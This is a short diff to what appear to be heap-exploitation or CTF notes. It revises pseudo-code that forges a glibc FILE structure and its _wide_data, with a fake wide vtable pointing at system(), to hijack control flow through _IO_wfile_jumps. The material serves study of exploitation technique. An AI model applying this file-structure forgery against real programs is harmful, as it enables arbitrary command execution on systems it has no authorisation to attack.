@@ -222,9 +222,10 @@ f->_mode = 0; // +0xc0 (note: pwntools FILE struct doesn't have this, but can le
 f->vtable = &_IO_wfile_jumps; // +0xd8
 
 // _wide_data (can forge in heap etc)
+*_wide_data = system; // fake vtable
 _wide_data->_IO_write_base = 0; // +0x18
 _wide_data->_IO_buf_base = 0; // +0x30
-_wide_data->_wide_vtable = *(&(system) - 0x68); // <(ptr to system) - 0x68> at +0xe0
+_wide_data->_wide_vtable = _wide_data - 0x68; // <ptr to ptr to system> - 0x68 at +0xe0
 ```
 ### Another variant
 
